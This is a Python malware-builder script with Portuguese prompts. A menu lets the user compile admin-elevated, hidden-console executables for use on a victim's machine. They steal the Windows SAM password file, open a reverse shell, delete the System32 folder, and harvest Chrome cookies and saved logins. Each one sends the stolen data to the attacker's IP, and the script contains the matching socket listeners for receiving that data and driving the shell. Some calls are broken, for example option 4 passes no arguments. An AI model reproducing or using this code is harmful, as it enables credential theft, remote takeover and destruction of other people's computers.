import os
import shutil
import socket

def exibir_menu():
    print("""⠀⠀⠀⠀⠀⣀⣠⠤⠶⠶⣖⡛⠛⠿⠿⠯⠭⠍⠉⣉⠛⠚⠛⠲⣄⠀⠀⠀⠀⠀
⠀⠀⢀⡴⠋⠁⠀⡉⠁⢐⣒⠒⠈⠁⠀⠀⠀⠈⠁⢂⢅⡂⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠀⣼⠀⠀⠀⠁⠀⠀⠀⠂⠀⠀⠀⠀⢀⣀⣤⣤⣄⡈⠈⠀⠀⠀⠘⣇⠀⠀⠀
⢠⡾⠡⠄⠀⠀⠾⠿⠿⣷⣦⣤⠀⠀⣾⣋⡤⠿⠿⠿⠿⠆⠠⢀⣀⡒⠼⢷⣄⠀
⣿⠊⠊⠶⠶⢦⣄⡄⠀⢀⣿⠀⠀⠀⠈⠁⠀⠀⠙⠳⠦⠶⠞⢋⣍⠉⢳⡄⠈⣧
⢹⣆⡂⢀⣿⠀⠀⡀⢴⣟⠁⠀⢀⣠⣘⢳⡖⠀⠀⣀⣠⡴⠞⠋⣽⠷⢠⠇⠀⣼
⠀⢻⡀⢸⣿⣷⢦⣄⣀⣈⣳⣆⣀⣀⣤⣭⣴⠚⠛⠉⣹⣧⡴⣾⠋⠀⠀⣘⡼⠃
⠀⢸⡇⢸⣷⣿⣤⣏⣉⣙⣏⣉⣹⣁⣀⣠⣼⣶⡾⠟⢻⣇⡼⠁⠀⠀⣰⠋⠀⠀
⠀⢸⡇⠸⣿⡿⣿⢿⡿⢿⣿⠿⠿⣿⠛⠉⠉⢧⠀⣠⡴⠋⠀⠀⠀⣠⠇⠀⠀⠀
⠀⢸⠀⠀⠹⢯⣽⣆⣷⣀⣻⣀⣀⣿⣄⣤⣴⠾⢛⡉⢄⡢⢔⣠⠞⠁⠀⠀⠀⠀
⠀⢸⠀⠀⠀⠢⣀⠀⠈⠉⠉⠉⠉⣉⣀⠠⣐⠦⠑⣊⡥⠞⠋⠀⠀⠀⠀⠀⠀⠀
⠀⢸⡀⠀⠁⠂⠀⠀⠀⠀⠀⠀⠒⠈⠁⣀⡤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠶⢤⣤⣤⣤⣤⡤⠴⠖⠚⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")

    print('[*] Escolha o que deseja fazer')
    print('------------------------------')
    print('1. Coletar senhas do sistema')
    print('2. Criar um Reverse shell')
    print('3. Deletar a pasta System32')
    print('4. Coletar cookies dos Navegadores')
    print('0. Sair')

def menu_escolha():
    while True:
        exibir_menu()
        print('----------------------------------------------')
        escolha = input("Escolha uma opção: ")
        if escolha == '1':
            ip_atacante = input('Insira o IP da sua máquina: ')
            porta_atacante = int(input('Insira a porta desejada: '))
            print('----------------------------------------------')
            criar_exec_SAM(ip_atacante, porta_atacante)
            receber_SAM(ip_atacante, porta_atacante)
        elif escolha == '2':
            ip_atacante = input('Insira o IP da sua máquina: ')
            porta_atacante = int(input('Insira a porta desejada: '))
            print('----------------------------------------------')
            criar_exec_revershell(ip_atacante, porta_atacante)
            rever_shell(ip_atacante, porta_atacante)
        elif escolha == '3':
            deletar_system32()
        elif escolha == '4':
            ip_atacante = input('Insira o IP da sua máquina: ')
            porta_atacante = int(input('Insira a porta desejada: '))
            criar_exec_cap_cookies()
            receb_cookies()  
        elif escolha == '0':
            print('----------------------------------------------')
            print('[*] saindo...')
            break
        else:
            print('[*] opção invalida.')

def receb_cookies(ip_atacante, porta_atacante):
    caminho_destino = 'Dados_capturados.txt'

    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.bind((ip_atacante, porta_atacante))
    serv.listen(1)

    print('----------------------------------------------')
    print(f'[*] Esperando conexão em {ip_atacante}:{porta_atacante}')
    conn, addr = serv.accept()
    with conn:
        print(f'[*] Conexão estabelecida com {addr}')
        with open(caminho_destino, 'wb') as arq:
            while True:
                dados = conn.recv(4096)
                if not dados:
                    break
                arq.write(dados)
            print('[*] Dados recebidos com sucesso')

def receber_SAM(ip_atacante, porta_atacante):
    
    cami_destino = 'Senhas_capturadas'

    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.bind((ip_atacante, porta_atacante))
    serv.listen(1)

    print('----------------------------------------------')
    print(f'[*] Esperando conexão em {ip_atacante}:{porta_atacante}')
    conn, addr = serv.accept()
    with conn:
        print(f'[*] Conexão estabelecida com {addr}')
        with open(cami_destino, 'wb') as arq:
            while True:
                sam = conn.recv(4096)
                if not sam:
                    break
                arq.write(sam)
            print('[*] Senhas recebidas com sucesso')

def rever_shell(ip_atacante, porta_atacante):
    BUFFER_SIZE = 1024

    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.bind((ip_atacante, porta_atacante))
    serv.listen(1)

    print('----------------------------------------------')
    print(f'[*] esperando conexão em {ip_atacante}:{porta_atacante}')
    conn, addr = serv.accept()
    print(f'[*] Conexão estabelecida com {addr}')

    while True:
        comandos = input('Shell> ')
        if comandos.lower() == "exit":
            conn.send(comandos.encode())
            break
        conn.send(comandos.encode())
        resultados = conn.recv(BUFFER_SIZE).decode()
        print(resultados)

    conn.close()
    serv.close()

def deletar_system32():
    try:
        code = """
import os
import shutil

def deletar_system32():
    pasta_system32 = 'C:/Windows/System32'
    try:
        shutil.rmtree(pasta_system32)
        print("Pasta System32 deletada com sucesso.")
    except Exception as e:
        print(f"Erro ao deletar a pasta System32: {e}")

deletar_system32()
"""
        with open("deletar_system32.py", "w") as f:
            f.write(code)

        with open("deletar_system32.exe.manifest", "w") as f:
            f.write("""
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
        <security>
            <requestedPrivileges>
                <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
            </requestedPrivileges>
        </security>
    </trustInfo>
</assembly>
""")

        os.system("pyinstaller --onefile --noconsole --manifest deletar_system32.exe.manifest deletar_system32.py")
        print('----------------------------------------------')
        print("[*] Executável para deletar System32 criado com sucesso, executável está na pasta dist. Execute-o na máquina da vítima.")
    
    except Exception as e:
        print("[*] rro ao criar o executável.")
        print(e)
    
    finally:
        limpar_arquivos = ["deletar_system32.py", "deletar_system32.exe.manifest", "build", "deletar_system32.spec"]
        for file in limpar_arquivos:
            if os.path.isfile(file):
                os.remove(file)
            elif os.path.isdir(file):
                shutil.rmtree(file)

def criar_exec_revershell(ip_atacante, porta_atacante):
    try:
        code = f"""
import socket
import subprocess

def iniciar_reverse_shell(ip_atacante, porta_atacante):
    BUFFER_SIZE = 1024

    s = socket.socket()
    s.connect((ip_atacante, porta_atacante))

    while True:
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())

    s.close()

ip_atacante = '{ip_atacante}'
porta_atacante = {porta_atacante}

iniciar_reverse_shell(ip_atacante, porta_atacante)
"""
        with open("reverse_shell.py", "w") as f:
            f.write(code)

        with open("reverse_shell.exe.manifest", "w") as f:
            f.write("""
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
        <security>
            <requestedPrivileges>
                <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
            </requestedPrivileges>
        </security>
    </trustInfo>
</assembly>
""")

        os.system("pyinstaller --onefile --noconsole --manifest reverse_shell.exe.manifest reverse_shell.py")

        print('----------------------------------------------')
        print("[*] Executável de reverse shell criado com sucesso, executável está na pasta dist. Execute-o na máquina da vítima.")
    
    except Exception as e:
        print('----------------------------------------------')
        print("[*] Erro ao criar o executável.")
        print(e)
    
    finally:
        limpar_arquivos = ["reverse_shell.py", "reverse_shell.exe.manifest", "build", "reverse_shell.spec"]
        for file in limpar_arquivos:
            if os.path.isfile(file):
                os.remove(file)
            elif os.path.isdir(file):
                shutil.rmtree(file)


def criar_exec_SAM(ip_atacante, porta_atacante):
    try:
        code = f"""
import socket
import os
import shutil

def enviar_SAM(ip_atacante, porta_atacante):
    pasta_do_SAM = 'C:/Windows/System32/config/SAM'
    pasta_do_SAM_temp = 'C:/Windows/Temp/SAM_copy'

    shutil.copyfile(pasta_do_SAM, pasta_do_SAM_temp)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip_atacante, porta_atacante))
        with open(pasta_do_SAM, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                s.sendall(chunk)

    os.remove(pasta_do_SAM_temp)

ip_atacante = '{ip_atacante}'
porta_atacante = {porta_atacante}

enviar_SAM(ip_atacante, porta_atacante)
"""
        with open("Roub_senhas.py", "w") as f:
            f.write(code)

        with open("Roub_senhas.exe.manifest", "w") as f:
            f.write("""
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
        <security>
            <requestedPrivileges>
                <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
            </requestedPrivileges>
        </security>
    </trustInfo>
</assembly>
""")

        os.system("pyinstaller --onefile --noconsole --manifest Roub_senhas.exe.manifest Roub_senhas.py")

        print('----------------------------------------------')
        print("[*] Executável de roubo de senhas criado com sucesso, executavel esta na pasta dist. Execute-o na máquina da vítima.")
    
    except Exception as e:
        print('----------------------------------------------')
        print("[*] Erro ao criar o executável.")
        print(e)
    
    finally:
        limpar_arquivos = ["Roub_senhas.py", "Roub_senhas.exe.manifest", "build", "Roub_senhas.spec"]
        for file in limpar_arquivos:
            if os.path.isfile(file):
                os.remove(file)
            elif os.path.isdir(file):
                shutil.rmtree(file)

def criar_exec_cap_cookies(ip_atacante, porta_atacante):
    try:
        code = f"""
import socket
import os
import shutil
import sqlite3

def capturar_cookies_senhas():
    caminho_dados = 'C:\Windows\Temp\Dados_capturados.txt'

    cookie_db = os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default/Cookies'
    conn = sqlite3.connect(cookie_db)
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, value FROM cookies')
    cookies = cursor.fetchall()
    conn.close()

    with open(caminho_dados, 'w') as f:
        f.write('Cookies:\\n')
        for cookie in cookies:
            f.write(f'Host: {cookie[0]}, Name: {cookie[1]}, Value: {cookie[2]}\\n')

    login_db = os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default/Login Data'
    conn = sqlite3.connect(login_db)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    logins = cursor.fetchall()
    conn.close()

    with open(caminho_dados, 'a') as f:
        f.write('\\nSenhas:\\n')
        for login in logins:
            f.write(f'URL: {login[0]}, Username: {login[1]}, Password: {login[2]}\\n')

def enviar_dados(ip_atacante, porta_atacante):
    caminho_dados = 'C:/Windows/Temp/Dados_capturados.txt'
    capturar_cookies_senhas()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip_atacante, porta_atacante))
        with open(caminho_dados, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                s.sendall(chunk)

    os.remove(caminho_dados)

ip_atacante = '{ip_atacante}'
porta_atacante = {porta_atacante}

enviar_dados(ip_atacante, porta_atacante)
"""
        with open("Capturar_dados.py", "w") as f:
            f.write(code)

        with open("Capturar_dados.exe.manifest", "w") as f:
            f.write("""
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
        <security>
            <requestedPrivileges>
                <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
            </requestedPrivileges>
        </security>
    </trustInfo>
</assembly>
""")

        os.system("pyinstaller --onefile --noconsole --manifest Capturar_dados.exe.manifest Capturar_dados.py")

        print('----------------------------------------------')
        print("[*] Executável de captura de dados criado com sucesso, executável está na pasta dist. Execute-o na máquina da vítima.")
    
    except Exception as e:
        print('----------------------------------------------')
        print("[*] Erro ao criar o executável.")
        print(e)
    
    finally:
        limpar_arquivos = ["Capturar_dados.py", "Capturar_dados.exe.manifest", "build", "Capturar_dados.spec"]
        for file in limpar_arquivos:
            if os.path.isfile(file):
                os.remove(file)
            elif os.path.isdir(file):
                shutil.rmtree(file)

if __name__ == "__main__":
    menu_escolha()